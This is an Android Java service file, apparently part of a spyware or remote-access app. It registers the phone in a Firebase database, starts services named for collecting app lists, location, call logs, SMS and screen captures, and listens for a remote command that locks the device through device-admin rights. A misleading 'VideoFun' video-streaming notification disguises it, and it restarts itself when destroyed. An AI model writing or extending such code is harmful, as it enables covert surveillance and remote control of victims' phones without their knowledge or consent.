package com.my.Refiner.Cash.User;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class CommandPoller extends Service {

    private static final String TAG = "CommandPoller";
    private static final String CHANNEL_ID = "mdm_service_channel";
    private static final int NOTIFICATION_ID = 1;

    private DatabaseReference dbRef;
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private String deviceId;
    private ValueEventListener commandListener;
    private boolean servicesStarted = false;

    @Override
    public void onCreate() {
        super.onCreate();
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MyAdminReceiver.class);

        // ✅ Device ID সঠিকভাবে সেভ করুন
        SharedPreferences prefs = getSharedPreferences("mdm", MODE_PRIVATE);
        deviceId = prefs.getString("device_id", null);
        if (deviceId == null || deviceId.equals("unknown")) {
            deviceId = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ANDROID_ID);
            prefs.edit().putString("device_id", deviceId).apply();
            Log.d(TAG, "Device ID saved: " + deviceId);
        }

        dbRef = FirebaseDatabase.getInstance().getReference();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundService();
        registerDeviceOnline();

        if (!servicesStarted) {
            servicesStarted = true;
            startAllServices();
        }

        if (commandListener == null) {
            listenForCommands();
        }

        return START_STICKY;
    }

    private void startAllServices() {
        try {
            startService(new Intent(this, AppListService.class));
            startService(new Intent(this, LocationService.class));
            startService(new Intent(this, CallLogService.class));
            startService(new Intent(this, SmsService.class));
            startService(new Intent(this, ScreenCaptureService.class));
            startService(new Intent(this, LiveScreenService.class));
            Log.d(TAG, "All services started");
        } catch (Exception e) {
            Log.e(TAG, "Service start error: " + e.getMessage());
        }
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Video Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Video streaming");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("VideoFun")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_media_play)
                    .build();
        } else {
            notification = new Notification.Builder(this)
                    .setContentTitle("VideoFun")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_media_play)
                    .build();
        }

        startForeground(NOTIFICATION_ID, notification);
    }

    private void registerDeviceOnline() {
        try {
            dbRef.child("devices").child(deviceId).child("status").setValue("online");
            dbRef.child("devices").child(deviceId).child("lastSeen")
                    .setValue(System.currentTimeMillis());
            dbRef.child("devices").child(deviceId).child("name")
                    .setValue(android.os.Build.MODEL);
            dbRef.child("devices").child(deviceId).child("user")
                    .setValue("User");
        } catch (Exception e) {
            Log.e(TAG, "Register error: " + e.getMessage());
        }
    }

    private void listenForCommands() {
        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean locked = snapshot.getValue(Boolean.class);
                Boolean shouldLock = locked != null ? locked : false;
                if (shouldLock) {
                    executeLock();
                }
                Log.d(TAG, "Lock status: " + shouldLock);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e(TAG, "Firebase error: " + error.getMessage());
            }
        };

        dbRef.child("devices").child(deviceId).child("locked")
                .addValueEventListener(commandListener);
    }

    private void executeLock() {
        if (dpm.isAdminActive(adminComponent)) {
            try {
                dpm.lockNow();
                Log.d(TAG, "Device locked!");
            } catch (Exception e) {
                Log.e(TAG, "Lock failed: " + e.getMessage());
            }
        } else {
            Log.w(TAG, "Admin not active");
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (commandListener != null) {
            dbRef.child("devices").child(deviceId).child("locked")
                    .removeEventListener(commandListener);
        }
        Intent intent = new Intent(this, CommandPoller.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
